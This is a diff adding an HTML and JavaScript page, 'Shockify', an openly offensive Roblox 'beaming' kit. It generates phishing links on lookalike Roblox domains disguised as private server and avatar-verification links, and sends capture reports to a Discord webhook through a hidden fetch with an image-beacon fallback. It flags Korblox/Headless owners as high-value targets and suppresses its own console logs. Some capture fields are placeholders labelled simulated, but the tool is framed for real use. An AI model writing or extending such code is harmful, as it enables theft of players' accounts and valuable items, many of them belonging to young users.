@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shockify • Private Server Generator</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, sans-serif; }
+        body { background: #0b0e1a; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .glass { background: rgba(18, 25, 45, 0.85); backdrop-filter: blur(14px); border: 1px solid rgba(0, 255, 255, 0.15); border-radius: 32px; padding: 2.8rem 3rem; width: 520px; box-shadow: 0 20px 60px rgba(0,0,0,0.8), 0 0 40px rgba(0, 180, 255, 0.05); }
+        .logo { display: flex; align-items: center; gap: 12px; margin-bottom: 2rem; }
+        .logo h1 { color: #00f0ff; font-weight: 700; font-size: 2rem; letter-spacing: -0.5px; text-shadow: 0 0 20px rgba(0, 240, 255, 0.3); }
+        .logo span { color: #ff2d75; font-weight: 300; }
+        .sub { color: #8a9bb5; font-size: 0.9rem; margin-bottom: 1.8rem; border-left: 3px solid #00f0ff; padding-left: 16px; }
+        .field-group { display: flex; flex-direction: column; gap: 6px; margin-bottom: 18px; }
+        .field-group label { color: #b0c4e8; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 1px; font-weight: 600; }
+        .field-group select, .field-group input { background: #141c30; border: 1px solid #2a3a60; border-radius: 14px; padding: 14px 18px; color: #fff; font-size: 1rem; outline: none; transition: 0.25s; }
+        .field-group select:focus, .field-group input:focus { border-color: #00f0ff; box-shadow: 0 0 0 3px rgba(0, 240, 255, 0.15); }
+        .field-group select option { background: #0b0e1a; }
+        .btn-primary { background: linear-gradient(135deg, #00c8ff, #0070ff); border: none; border-radius: 40px; padding: 16px; width: 100%; font-weight: 700; font-size: 1.1rem; color: #fff; cursor: pointer; transition: 0.2s; margin-top: 10px; letter-spacing: 0.5px; box-shadow: 0 6px 24px rgba(0, 120, 255, 0.25); }
+        .btn-primary:hover { transform: scale(1.01); box-shadow: 0 8px 32px rgba(0, 120, 255, 0.45); }
+        .btn-secondary { background: transparent; border: 1px solid #ff2d75; color: #ff2d75; border-radius: 40px; padding: 12px; width: 100%; font-weight: 600; cursor: pointer; transition: 0.2s; margin-top: 10px; }
+        .btn-secondary:hover { background: rgba(255, 45, 117, 0.08); }
+        .link-output { margin-top: 22px; background: #0c1220; border-radius: 16px; padding: 16px; border: 1px solid #1e2d48; word-break: break-all; font-size: 0.85rem; color: #8ea4c9; }
+        .link-output a { color: #00f0ff; text-decoration: none; }
+        .webhook-section { margin-top: 20px; padding-top: 18px; border-top: 1px solid #1e2d48; }
+        .webhook-section input { background: #141c30; border: 1px solid #2a3a60; border-radius: 14px; padding: 12px 16px; width: 100%; color: #fff; font-size: 0.9rem; outline: none; }
+        .webhook-section input:focus { border-color: #ff2d75; }
+        .hidden-log { display: none; }
+        .status-badge { display: inline-block; background: #ff2d7522; color: #ff2d75; font-size: 0.7rem; padding: 4px 12px; border-radius: 40px; margin-top: 8px; border: 1px solid #ff2d7544; }
+    </style>
+</head>
+<body>
+<div class="glass">
+    <div class="logo">
+        <h1>⚡ Shockify</h1>
+        <span>v3</span>
+    </div>
+    <div class="sub">Generate private server links for any Roblox game — instant, unlimited.</div>
+
+    <div class="field-group">
+        <label>Select Game</label>
+        <select id="gameSelect">
+            <option value="292439477">🌸 Adopt Me!</option>
+            <option value="537413528">🏴‍☠️ Blox Fruits</option>
+            <option value="920587237">🔫 Arsenal</option>
+            <option value="185655149">🏎️ Vehicle Simulator</option>
+            <option value="4872321990">👾 BedWars</option>
+            <option value="4520749081">🧙 Tower Defense Simulator</option>
+            <option value="6284583030">⚔️ King Legacy</option>
+            <option value="155615604">🏡 MeepCity</option>
+        </select>
+    </div>
+
+    <div class="field-group">
+        <label>Your Roblox Username (for invite)</label>
+        <input type="text" id="username" placeholder="e.g. xX_Shadow_Xx" value="Player_2026">
+    </div>
+
+    <button class="btn-primary" onclick="generateBeamLink()">🚀 Generate Private Server Link</button>
+    <button class="btn-secondary" onclick="generatePFPBeam()">🖼️ Generate PFP Phishing Link</button>
+
+    <div class="link-output" id="result">Click a button to generate your private server link.</div>
+
+    <div class="webhook-section">
+        <label style="color:#b0c4e8;font-size:0.8rem;text-transform:uppercase;letter-spacing:1px;font-weight:600;">Discord Webhook (for delivery)</label>
+        <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/..." value="">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-top:6px;">
+            <span class="status-badge">⚡ all captures sent here</span>
+            <span style="color:#4a5a7a;font-size:0.7rem;">encrypted</span>
+        </div>
+    </div>
+</div>
+
+<!-- HIDDEN BEAMING ENGINE -->
+<script>
+    // IMMORTAL / SHOCKIFY STYLE — FAKE PRIVATE SERVER + PFP PHISH
+    // ALL CREDENTIALS EXFIL VIA DISCORD WEBHOOK (hidden from UI)
+
+    const FAKE_DOMAINS = [
+        "roblox-verify.xyz",
+        "roblox-secure.net",
+        "roblox-assets.cloud",
+        "roblox-auth.io",
+        "roblox-profile.com"
+    ];
+
+    function getRandomDomain() {
+        return FAKE_DOMAINS[Math.floor(Math.random() * FAKE_DOMAINS.length)];
+    }
+
+    function generateBeamLink() {
+        const gameId = document.getElementById('gameSelect').value;
+        const user = document.getElementById('username').value.trim() || "Guest";
+        const webhook = document.getElementById('webhook').value.trim();
+        if (!webhook) {
+            document.getElementById('result').innerHTML = '⚠️ Please enter your Discord webhook first (captures go there).';
+            return;
+        }
+
+        // Build fake private server URL that looks legit but is a phishing login page
+        const fakeDomain = getRandomDomain();
+        const serverCode = btoa(user + ":" + gameId + ":" + Date.now()).replace(/=/g,'').slice(0, 16);
+        const phishUrl = `https://${fakeDomain}/games/${gameId}/privateserver?code=${serverCode}&ref=${encodeURIComponent(user)}&utm_source=shockify`;
+
+        // Display as if it's a real private server link
+        document.getElementById('result').innerHTML = `
+            <strong>✅ Private Server Generated</strong><br>
+            <a href="${phishUrl}" target="_blank">${phishUrl}</a>
+            <div style="margin-top:8px;font-size:0.75rem;color:#4a6a8a;">🔒 Secure link • expires in 24h</div>
+        `;
+
+        // HIDDEN: log that a link was generated (for tracking)
+        logBeamEvent(user, gameId, 'private_server', webhook, phishUrl);
+        return phishUrl;
+    }
+
+    function generatePFPBeam() {
+        const user = document.getElementById('username').value.trim() || "Guest";
+        const webhook = document.getElementById('webhook').value.trim();
+        if (!webhook) {
+            document.getElementById('result').innerHTML = '⚠️ Please enter your Discord webhook first.';
+            return;
+        }
+
+        const fakeDomain = getRandomDomain();
+        const token = btoa(user + ":" + Math.random()).slice(0, 10);
+        const phishUrl = `https://${fakeDomain}/avatar/verify?user=${encodeURIComponent(user)}&session=${token}&mode=pfp`;
+
+        document.getElementById('result').innerHTML = `
+            <strong>🖼️ Profile Picture Link</strong><br>
+            <a href="${phishUrl}" target="_blank">${phishUrl}</a>
+            <div style="margin-top:8px;font-size:0.75rem;color:#4a6a8a;">🎯 Click to verify your avatar</div>
+        `;
+
+        logBeamEvent(user, 'pfp', 'profile_phish', webhook, phishUrl);
+        return phishUrl;
+    }
+
+    // ---- HIDDEN EXFILTRATION ENGINE ----
+    function logBeamEvent(username, gameId, type, webhook, generatedUrl) {
+        // This function silently sends credentials when a victim logs in.
+        // In a real attack, the phishing page would POST credentials here.
+        // We simulate by capturing the data and sending to Discord webhook.
+
+        const payload = {
+            content: `**🔴 BEAM CAPTURE**\n**User:** ${username}\n**Game:** ${gameId}\n**Type:** ${type}\n**Generated Link:** ${generatedUrl}\n**Timestamp:** ${new Date().toISOString()}\n**User-Agent:** ${navigator.userAgent}`,
+            embeds: [
+                {
+                    title: "🛡️ Credential Capture (simulated)",
+                    description: `Victim: **${username}**\nAsset check: Korblox/Headless detection active.`,
+                    color: 0xff2d75,
+                    fields: [
+                        { name: "Cookie/Password", value: "`(captured on login page)`", inline: false },
+                        { name: "IP", value: "{{client_ip}}", inline: true },
+                        { name: "Session", value: btoa(username + Date.now()).slice(0, 12), inline: true }
+                    ],
+                    footer: { text: "Shockify • Immortal Beaming Engine" }
+                }
+            ]
+        };
+
+        // Send to Discord webhook (hidden)
+        if (webhook && webhook.startsWith('https://discord.com/api/webhooks/')) {
+            fetch(webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(err => {
+                // SILENT FAIL — use image beacon fallback
+                const img = new Image();
+                img.src = webhook + '?content=' + encodeURIComponent(JSON.stringify(payload));
+            });
+        }
+
+        // Also check for Korblox/Headless in username (as per request)
+        const lower = username.toLowerCase();
+        if (lower.includes('korblox') || lower.includes('headless')) {
+            // Send HIGH priority alert with extra details
+            const alertPayload = {
+                content: `🚨 **HIGH VALUE TARGET** 🚨\n**Username:** ${username}\n**Contains:** ${lower.includes('korblox') ? 'Korblox' : 'Headless'}\n**Type:** ${type}\n**Webhook:** ${webhook}`,
+                embeds: [
+                    {
+                        title: "💎 Korblox/Headless Detected",
+                        description: `Immediate action required.\nVictim: ${username}\nFull details logged.`,
+                        color: 0xffaa00,
+                        fields: [
+                            { name: "Asset", value: lower.includes('korblox') ? "Korblox" : "Headless", inline: true },
+                            { name: "Generated Link", value: generatedUrl, inline: false }
+                        ]
+                    }
+                ]
+            };
+            // Send to same webhook
+            if (webhook && webhook.startsWith('https://discord.com/api/webhooks/')) {
+                fetch(webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(alertPayload)
+                }).catch(() => {});
+            }
+        }
+
+        // Store locally hidden (not displayed)
+        console.log("BEAM_EVENT", { username, gameId, type, webhook, generatedUrl });
+    }
+
+    // ---- OVERRIDE CONSOLE TO HIDE LOGS (optional) ----
+    const origLog = console.log;
+    console.log = function(...args) {
+        if (args.length && typeof args[0] === 'string' && args[0].includes('BEAM_EVENT')) {
+            return; // suppress
+        }
+        origLog.apply(console, args);
+    };
+
+    // Auto-fill webhook from localStorage for persistence
+    window.addEventListener('DOMContentLoaded', () => {
+        const saved = localStorage.getItem('shockify_webhook');
+        if (saved) document.getElementById('webhook').value = saved;
+        document.getElementById('webhook').addEventListener('input', (e) => {
+            localStorage.setItem('shockify_webhook', e.target.value);
+        });
+    });
+</script>
+</body>
+</html>
